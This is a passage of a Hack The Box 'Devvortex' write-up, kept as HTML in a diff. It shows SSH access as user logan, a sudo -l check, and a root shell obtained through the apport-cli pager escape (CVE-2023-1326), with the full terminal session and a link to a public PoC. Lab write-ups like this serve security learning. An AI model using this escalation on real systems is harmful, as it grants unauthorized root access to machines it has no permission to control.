s see if we can SSH into the machine with this creds.</span></p>
+<pre class="language-bash line-numbers"><code>ssh logan@10.10.11.242</code></pre>
+<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup13.png" alt="Devvortex - HTB Writeup" width="604" height="371" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup13-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup13-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup13-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup13-lg.png 1024w"></figure>
+<p>Yes, we got the access with SSH!</p>
+<h3>User Flag</h3>
+<p>We can <code>ls</code> and <code>cat user.txt</code> to get our user flag.</p>
+<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup15.png" alt="Devvortex - HTB Writeup" width="441" height="130" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup15-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup15-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup15-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup15-lg.png 1024w"></figure>
+<h3>System Flag</h3>
+<p><span data-slate-fragment="JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMkNoZWNraW5nJTIwb3VyJTIwc3VkbyUyMHByaXZpbGVnZXMlMjIlMkMlMjJtYXJrcyUyMiUzQSU1QiU1RCUyQyUyMnNlbGVjdGlvbnMlMjIlM0ElNUIlNUQlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJ5dENqVmZjTXM3ZkIlMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJndzJLWGdmYTJYckglMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjI0bzNYWkhYbkF6WGglMjIlN0Q=">Checking our sudo privileges with bellow command.</span></p>
+<pre class="language-bash line-numbers"><code>sudo -l</code></pre>
+<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup14.png" alt="Devvortex - HTB Writeup" width="1272" height="237" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup14-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup14-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup14-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup14-lg.png 1024w"></figure>
+<div>
+<div class="css-175oi2r r-1ro0kt6 r-16y2uox r-1wbh5a2">
+<div class="view_manYY blockWrapper_8BIg7 vertical0_jPhI0 horizontalAuto_xck7M">
+<div class="css-175oi2r r-1ro0kt6 r-16y2uox r-1wbh5a2 r-18u37iz r-1777fci" data-rnwr1490-1777fci="true" data-rnwr700-1777fci="true">
+<div class="css-175oi2r r-1ro0kt6 r-16y2uox r-1wbh5a2">
+<div class="css-175oi2r">
+<div class="css-175oi2r">
+<div class="view_manYY relative_kNGzo column_Pzect vertical400_IGNdU top200_FwkHm bottom200_HuRwz" data-key="AXM5FiIyfH0F">
+<div class="r-1oszu61 r-1xc7w19 r-1phboty r-1yadl64 r-deolkf r-6koalj r-eqz5dr r-crgep1 r-ifefl9 r-bcqeeo r-t60dpp r-bnwqim r-417010 r-1ro0kt6 r-16y2uox r-1wbh5a2" data-block-content="AXM5FiIyfH0F">
+<div class="css-1rynq56 r-gg6oyi r-ubezar r-1o2nx2a r-135wba7 r-37p410 r-fdjqy7 r-1xnzce8" dir="auto"><span data-key="Bl96f2ur3jHZ">Here, we can run the program </span><code><span style="color: var(--text-primary-color); font-family: var(--editor-font-family); font-size: inherit; font-weight: var(--font-weight-normal);">/usr/bin/apport-cli</span></code>. A<span style="color: var(--text-primary-color); font-family: var(--editor-font-family); font-size: inherit; font-weight: var(--font-weight-normal);">fter a quick google search I found that this program is vulnerable.</span></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<p>Unveiling a privilege escalation vulnerability in apport-cli 2.26.0 and earlier, reminiscent of <a class="af pv" href="https://github.com/advisories/GHSA-8989-8fhv-vq42" rel="noopener ugc nofollow" target="_blank">CVE-2023–26604</a>. For the exploit to succeed, the system must be uniquely configured, allowing unprivileged users to execute sudo apport-cli. With less configured as the pager and adjustable terminal size, a local attacker gains the privilege escalator. While rare, the possibility underscores the importance of prudent sudo configurations. Stay vigilant!</p>
+<p><a href="https://github.com/diego-tella/CVE-2023-1326-PoC" target="_blank" class="extlink extlink-icon-5 "  title="sakibulalikhan" rel="noopener noreferrer">https://github.com/diego-tella/CVE-2023-1326-PoC</a></p>
+<p>Through this vuln, <span data-slate-fragment="JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMmVzc2VudGlhbGx5JTIwd2UlMjBoYXZlJTIwdGhlJTIwYWJpbGl0eSUyMHRvJTIwcmVhZCUyMGElMjBjcmFzaCUyMHJlcG9ydCUyMGluJTIwYSUyMHZpJTIwbGlrZSUyMHByb2dyYW0lMkMlMjBmcm9tJTIwaGVyZSUyMHdlJTIwY2FuJTIwZXhlY3V0ZSUyMGJhc2glMjBhbmQlMjBqdW1wJTIwc3RyYWlnaHQlMjBpbnRvJTIwYSUyMHJvb3QlMjBiYXNoJTIwc2hlbGwlMjIlMkMlMjJtYXJrcyUyMiUzQSU1QiU1RCUyQyUyMnNlbGVjdGlvbnMlMjIlM0ElNUIlNUQlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjI4VDZnR3pSQU5lVTYlMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjIzd3dwaWZTMlh2Um4lMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjIwcjlLU1dacFI1ZUIlMjIlN0Q=">essentially we have the ability to read a crash report in a <code>vi</code> like program, from here we can execute bash and jump straight into a root bash shell.</span></p>
+<pre class="language-bash line-numbers"><code>logan@devvortex:~$ sudo /usr/bin/apport-cli -f
+
+*** What kind of problem do you want to report?
+
+
+Choices:
+  1: Display (X.org)
+  2: External or internal storage devices (e. g. USB sticks)
+  3: Security related problems
+  4: Sound/audio related problems
+  5: dist-upgrade
+  6: installation
+  7: installer
+  8: release-upgrade
+  9: ubuntu-release-upgrader
+  10: Other problem
+  C: Cancel
+Please choose (1/2/3/4/5/6/7/8/9/10/C): 1
+
+
+*** Collecting problem information
+
+The collected information can be sent to the developers to improve the
+application. This might take a few minutes.
+
+*** What display problem do you observe?
+
+
+Choices:
+  1: I don't know
+  2: Freezes or hangs during boot or usage
+  3: Crashes or restarts back to login screen
+  4: Resolution is incorrect
+  5: Shows screen corruption
+  6: Performance is worse than expected
+  7: Fonts are the wrong size
+  8: Other display-related problem
+  C: Cancel
+Please choose (1/2/3/4/5/6/7/8/C): 2
+
+*** 
+
+To debug X freezes, please see https://wiki.ubuntu.com/X/Troubleshooting/Freeze
+
+Press any key to continue... 
+
+..dpkg-query: no packages found matching xorg
+...............
+
+*** Send problem report to the developers?
+
+After the problem report has been sent, please fill out the form in the
+automatically opened web browser.
+
+What would you like to do? Your options are:
+  S: Send report (1.6 KB)
+  V: View report
+  K: Keep report file for sending later or copying to somewhere else
+  I: Cancel and ignore future crashes of this program version
+  C: Cancel
+Please choose (S/V/K/I/C): !
+What would you like to do? Your options are:
+  S: Send report (1.6 KB)
+  V: View report
+  K: Keep report file for sending later or copying to somewhere else
+  I: Cancel and ignore future crashes of this program version
+  C: Cancel
+Please choose (S/V/K/I/C): v
+root@devvortex:/home/logan# </code></pre>
+<p id="9de9" class="pw-post-body-paragraph mi mj gr mk b ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf gk bj" data-selectable-paragraph="">After executing the command, when prompted, type <code class="cw ok ol om on b">V</code>and wait it for some seconds. Let the<code class="cw ok ol om on b">apport-cli</code> to load all its magic.</p>
+<p id="feb1" class="pw-post-body-paragraph mi mj gr mk b ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf gk bj" data-selectable-paragraph="">As soon as you <code class="cw ok ol om on b">:</code> symbol, the pager is there!</p>
+<p id="f73e" class="pw-post-body-paragraph mi mj gr mk b ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf gk bj" data-selectable-paragraph="">Let’s run <code class="cw ok ol om on b">!/bin/bash</code> to spawn the shell as root (remember, we started the <code class="cw ok ol om on b">apport-cli</code> executable with <code class="cw ok ol om on b">sudo</code>)</p>
+<p>Hurrah, now we got the root shell!!!</p>
+<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup17.png" alt="Devvortex - HTB Writeup" width="510" height="139" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup17-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup17-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup17-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup17-lg.png 1024w"></figure>
+<p>We have our <strong class="mk gs">Devvortex </strong>machine, successfully rooted!</p>
+</div>
+</div>
+</div>
+</div>
 </div>
 </div>
 </div>
